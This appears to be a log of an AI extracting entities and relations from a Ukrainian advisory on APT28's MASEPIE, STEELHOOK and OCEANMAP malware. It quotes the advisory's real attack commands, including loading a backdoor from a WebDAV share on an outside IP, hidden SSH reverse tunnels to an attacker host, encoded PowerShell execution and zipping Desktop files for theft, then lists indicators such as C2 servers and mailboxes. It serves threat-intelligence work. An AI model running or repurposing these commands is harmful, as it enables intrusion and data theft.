gAbwBvAGsAIAAtAE0AZQB0AGgAbwBkACAAUABPAFMAVAAgAC0AQgBvAGQAeQAgACQAcABvAHMAdABQAGEAcgBhAG0AcwAgAC0AdQBzAGUAYgA7AA==
+\\194.126.178.8@80\webdav\Python39\python.exe \\194.126.178.8@80\webdav\Python39\Client.py
+cmd /C start powershell.exe -w hid -nop -c "%LOCALAPPDATA%\python\python-3.10.0-embed-amd64\python.exe %LOCALAPPDATA%\python\python-3.10.0-embed-amd64\Client.py"
+powershell -c start-process ssh.exe -windowstyle Hidden -ArgumentList "-N -o ServerAliveInterval=30 -p80 root@88.209.251.6 -R 88.209.251.6:10858 -i %LOCALAPPDATA%\key -oPubkeyAcceptedKeyTypes=ssh-rsa -oStrictHostKeyChecking=no" -PassThru
+powershell -c start-process ssh.exe -windowstyle Hidden -ArgumentList "-N -o ServerAliveInterval=30 -p80 root@88.209.251.6 -R 88.209.251.6:10859 -i %LOCALAPPDATA%\key -oPubkeyAcceptedKeyTypes=ssh-rsa -oStrictHostKeyChecking=no" -PassThru
+powershell.exe&nbsp; -c "$a=Get-Content "%PROGRAMDATA%\2.txt";powershell.exe -windowstyle hidden -encodedCommand $a"powershell.exe -c $a=Get-Content "%PROGRAMDATA%\2.txt";powershell.exe -windowstyle hidden -encodedCommand $a
+powershell.exe -c $a=Get-Content -Encoding 'Default' -Path "%LOCALAPPDATA%\temp.txt";"$a"
+powershell.exe -c $a=Get-Content -Encoding 'String' -Path "%LOCALAPPDATA%\temp.txt";"$a"
+powershell.exe -c $a=Get-Content -Encoding 'ascii' -Path "%LOCALAPPDATA%\temp.txt";"$a"
+powershell.exe -c $a=Get-Content -Encoding 'oem' -Path "%LOCALAPPDATA%\temp.txt";"$a"
+powershell.exe -c $a=Get-Content -Encoding 'oem' -Path "%LOCALAPPDATA%\temp.txt";Compress-Archive -Force "$a" %LOCALAPPDATA%\s.zip
+powershell.exe -c $a=Get-Content -Encoding 'oem' -Path "%LOCALAPPDATA%\temp.txt";dir "$a"
+powershell.exe -c $a=Get-Content -Encoding 'oem' -Path "%LOCALAPPDATA%\temp1.txt";Compress-Archive -Force "$a" %LOCALAPPDATA%\s2.zip
+powershell.exe -c $a=Get-Content -Encoding 'oem' -Path "%LOCALAPPDATA%\temp2.txt";Compress-Archive -Force "$a" %LOCALAPPDATA%\s3.zip
+powershell.exe -c $a=Get-Content -Encoding 'oem' -Path "%LOCALAPPDATA%\temp2.txt";dir "$a"
+powershell.exe -c $a=Get-Content -Encoding 'unicode' -Path "%LOCALAPPDATA%\temp.txt";"$a"
+powershell.exe -c $a=Get-Content -Encoding 'utf32' -Path "%LOCALAPPDATA%\temp.txt";"$a"
+powershell.exe -c $a=Get-Content -Encoding 'utf8' -Path "%LOCALAPPDATA%\temp.txt";"$a"
+powershell.exe -c $a=Get-Content -Path "%LOCALAPPDATA%\temp.txt";"$a"
+powershell.exe -c $a=Get-Content -Path "%LOCALAPPDATA%\temp.txt";Compress-Archive -Force "$a" %LOCALAPPDATA%\s.zip
+powershell.exe -c Compress-Archive -Force %USERPROFILE%\Desktop\ %LOCALAPPDATA%\qz.zip
+powershell.exe -c Get-WinEvent -FilterHashtable @{logname="system"; id=1129}
+powershell.exe -c Get-WinEvent -FilterHashtable @{logname="system"; id=1501}
+powershell.exe -c dir /S %USERPROFILE% *.dat
+powershell.exe -c import-module ActiveDirectory;Get-AdDomainController
+powershell.exe -c net time /domain
+powershell.exe -c net time /domain:%DOMAIN%.local
+powershell.exe -w hid -nop -c %LOCALAPPDATA%\python\python-3.10.0-embed-amd64\python.exe %LOCALAPPDATA%\python\python-3.10.0-embed-amd64\Client.py
+powershell.exe -w hid -nop -c Expand-Archive -Force %PROGRAMDATA%\python.zip %PROGRAMDATA%\python
+powershell.exe -w hid -nop -c start "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.lnk"
+powershell.exe -w hid -nop gpresult /z
+powershell.exe -w hid -nop gpupdate
+powershell.exe Compress-Archive -Force %USERPROFILE%\Desktop\ %LOCALAPPDATA%\sys.zip
+powershell.exe Compress-Archive -Force %USERPROFILE%\Desktop\*.lnk %LOCALAPPDATA%\11.zip
+powershell.exe Compress-Archive %USERPROFILE%\Desktop %LOCALAPPDATA%\sys.zip
+powershell.exe Expand-Archive -Force %LOCALAPPDATA%\python.zip %LOCALAPPDATA%\python
+powershell.exe Get-ADDomainController
+powershell.exe Get-Content %LOCALAPPDATA%\i.lnk
+powershell.exe Get-DnsClientServerAddress
+powershell.exe Get-NetAdapter
+powershell.exe Get-NetAdapterBinding | Where-Object ComponentID -EQ 'ms_tcpip6'
+powershell.exe Get-NetIPConfiguration -All
+powershell.exe Resolve-DNSName %DC%
+powershell.exe Resolve-DNSName %DOMAIN%.local
+powershell.exe Test-NetConnection %FS% -Port 445 -v
+powershell.exe [System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()
+powershell.exe date
+powershell.exe dir %USERPROFILE%\Desktop
+powershell.exe ipconfig /flushdns
+powershell.exe net start dnscache
+powershell.exe net stop dnscache
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p>Рис.1 Приклад ланцюга ураження</p>
+
+=== RESPONSE (8.0s, in 12060 / out 2669 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "APT28",
+      "kind": "hacking group",
+      "gloss": "A Russian state-sponsored cyber espionage group associated with the General Staff Main Intelligence Directorate (GRU)."
+    },
+    {
+      "name": "MASEPIE",
+      "kind": "malware family",
+      "gloss": "A Python-based backdoor malware used for file download, upload, and arbitrary command execution."
+    },
+    {
+      "name": "STEELHOOK",
+      "kind": "malware family",
+      "gloss": "A PowerShell script designed to steal browser credentials and DPAPI master keys."
+    },
+    {
+      "name": "OCEANMAP",
+      "kind": "backdoor malware",
+      "gloss": "A C#-based backdoor that uses IMAP email drafts and inbox messages as its command and control channel."
+    },
+    {
+      "name": "OPENSSH",
+      "kind": "software product",
+      "gloss": "A suite of secure networking utilities based on the SSH protocol, often abused for network tunneling."
+    },
+    {
+      "name": "IMPACKET",
+      "kind": "software tool",
+      "gloss": "A collection of Python classes for working with network protocols, frequently used for lateral movement."
+    },
+    {
+      "name": "SMBEXEC",
+      "kind": "software tool",
+      "gloss": "A rapid psexec-style tool that enables command execution on remote Windows systems using SMB."
+    },
+    {
+      "name": "Chrome",
+      "kind": "software product",
+      "gloss": "A cross-platform web browser developed by Google."
+    },
+    {
+      "name": "Edge",
+      "kind": "software product",
+      "gloss": "A cross-platform web browser developed by Microsoft."
+    },
+    {
+      "name": "Trellix",
+      "kind": "cybersecurity company",
+      "gloss": "An American cybersecurity company specializing in extended detection and response."
+    },
+    {
+      "name": "Client.py",
+      "kind": "file name",
+      "gloss": "A Python script implementing the MASEPIE backdoor."
+    },
+    {
+      "name": "2.ps1",
+      "kind": "file name",
+      "gloss": "A PowerShell script implementing the STEELHOOK credential stealer."
+    },
+    {
+      "name": "VMSearch.exe",
+      "kind": "file name",
+      "gloss": "An executable file containing the OCEANMAP backdoor."
+    },
+    {
+      "name": "VMSearch.sfx.exe",
+      "kind": "file name",
+      "gloss": "A self-extracting archive containing the OCEANMAP backdoor executable."
+    },
+    {
+      "name": "VMSearch.url",
+      "kind": "file name",
+      "gloss": "A URL shortcut file used to achieve persistence for the OCEANMAP backdoor."
+    },
+    {
+      "name": "SystemUpdate.lnk",
+      "kind": "file name",
+      "gloss": "A Windows shortcut file used to achieve persistence for the MASEPIE backdoor."
+    },
+    {
+      "name": "KFP.311.152.2023.pdf.lnk",
+      "kind": "file name",
+      "gloss": "A malicious Windows shortcut file used in phishing attacks to trigger remote payload execution."
+    },
+    {
+      "name": "Стратегії України.pdf .lnk",
+      "kind": "file name",
+      "gloss": "A lure Windows shortcut file referencing Ukrainian strategy documents."
+    },
+    {
+      "name": "194.126.178.8",
+      "kind": "ip address",
+      "gloss": "An IP address used to host malicious WebDAV and payload files."
+    },
+    {
+      "name": "88.209.251.6",
+      "kind": "ip address",
+      "gloss": "An IP address used for SSH tunneling and command-and-control communication."
+    },
+    {
+      "name": "74.124.219.71",
+      "kind": "ip address",
+      "gloss": "An IP address identified as a command-and-control server for the OCEANMAP backdoor."
+    },
+    {
+      "name": "173.239.196.66",
+      "kind": "ip address",
+      "gloss": "An originating IP address associated with malicious email distribution."
+    },
+    {
+      "name": "jrb@bahouholdings.com",
+      "kind": "email address",
+      "gloss": "An email address used as a C2 mailbox for the OCEANMAP backdoor."
+    },
+    {
+      "name": "qasim.m@facadesolutionsuae.com",
+      "kind": "email address",
+      "gloss": "An email address used as a C2 mailbox for the OCEANMAP backdoor."
+    },
+    {
+      "name": "nas-files.firstcloudit.com",
+      "kind": "internet domain",
+      "gloss": "A domain name observed in the threat actor's network infrastructure."
+    },
+    {
+      "name": "ua-calendar.firstcloudit.com",
+      "kind": "internet domain",
+      "gloss": "A domain name observed in the threat actor's network infrastructure."
+    },
+    {
+      "name": "e-nas.firstcloudit.com",
+      "kind": "internet domain",
+      "gloss": "A domain name observed in the threat actor's network infrastructure."
+    },
+    {
+      "name": "webmail.facadesolutionsuae.com",
+      "kind": "internet domain",
+      "gloss": "A mail server domain used as C2 infrastructure for the OCEANMAP backdoor."
+    },
+    {
+      "name": "czyrqdnvpujmmjkfhhvsclx05sfi23bfr.oast.fun",
+      "kind": "internet domain",
+      "gloss": "An OAST domain used for exfiltrating stolen browser credentials."
+    }
+  ],
+  "relations": [
+    {
+      "head": "APT28",
+      "type": "uses-malware",
+      "tail": "MASEPIE",
+      "evidence": "активність асоційовано з діяльністю угрупування APT28"
+    },
+    {
+      "head": "APT28",
+      "type": "uses-malware",
+      "tail": "OCEANMAP",
+      "evidence": "активність асоційовано з діяльністю угрупування APT28"
+    },
+    {
+      "head": "APT28",
+      "type": "uses-malware",
+      "tail": "STEELHOOK",
+      "evidence": "активність асоційовано з діяльністю угрупування APT28"
+    },
+    {
+      "head": "APT28",
+      "type": "uses-tool",
+      "tail": "OPENSSH",
+      "evidence": "довантажується та запускається OPENSSH (для побудови тонелю)"
+    },
+    {
+      "head": "APT28",
+      "type": "uses-tool",
+      "tail": "IMPACKET",
+      "evidence": "на комп'ютері створюються IMPACKET, SMBEXEC"
+    },
+    {
+      "head": "APT28",
+      "type": "uses-tool",
+      "tail": "SMBEXEC",
+      "evidence": "на комп'ютері створюються IMPACKET, SMBEXEC"
+    },
+    {
+      "head": "MASEPIE",
+      "type": "downloads-payload",
+      "tail": "OPENSSH",
+      "evidence": "З використанням MASEPIE на комп'ютер довантажується та запускається OPENSSH"
+    },
+    {
+      "head": "MASEPIE",
+      "type": "downloads-payload",
+      "tail": "STEELHOOK",
+      "evidence": "З використанням MASEPIE на комп'ютер довантажується та запускається... STEELHOOK"
+    },
+    {
+      "head": "MASEPIE",
+      "type": "downloads-payload",
+      "tail": "OCEANMAP",
+      "evidence": "З використанням MASEPIE на комп'ютер довантажується та запускається... OCEANMAP"
+    },
+    {
+      "head": "STEELHOOK",
+      "type": "steals-credentials-from",
+      "tail": "Chrome",
+      "evidence": "STEELHOOK (викрадення даних Інтернет-браузерів Chrome/Edge)"
+    },
+    {
+      "head": "STEELHOOK",
+      "type": "steals-credentials-from",
+      "tail": "Edge",
+      "evidence": "STEELHOOK (викрадення даних Інтернет-браузерів Chrome/Edge)"
+    },
+    {
+      "head": "OCEANMAP",
+      "type": "uses-c2-server",
+      "tail": "74.124.219.71",
+      "evidence": "74[.]124.219.71 (OCEANMAP C2)"
+    },
+    {
+      "head": "OCEANMAP",
+      "type": "uses-c2-email",
+      "tail": "jrb@bahouholdings.com",
+      "evidence": "jrb@bahouholdings.com (OCEANMAP C2)"
+    },
+    {
+      "head": "OCEANMAP",
+      "type": "uses-c2-email",
+      "tail": "qasim.m@facadesolutionsuae.com",
+      "evidence": "qasim.m@facadesolutionsuae.com (OCEANMAP C2)"
+    },
+    {
+      "head": "OCEANMAP",
+      "type": "uses-c2-server",
+      "tail": "webmail.facadesolutionsuae.com",
+      "evidence": "webmail.facadesolutionsuae[.]com (OCEANMAP C2)"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "uses-malware",
+      "definition": "The threat actor utilizes a specific malware family during their operations."
+    },
+    {
+      "name": "uses-tool",
+      "definition": "The threat actor employs a specific utility, tool, or framework during an attack."
+    },
+    {
+      "name": "downloads-payload",
+      "definition": "A malware program downloads and executes an additional malware payload or tool."
+    },
+    {
+      "name": "steals-credentials-from",
+      "definition": "A malware or script extracts stored credentials or session data from a target application."
+    },
+    {
+      "name": "uses-c2-server",
+      "definition": "The malware connects to a specific IP address or domain for command and control purposes."
+    },
+    {
+      "name": "uses-c2-email",
+      "definition": "The malware uses a specific email account to transmit or receive command and control instructions."
+    }
+  ]
+}
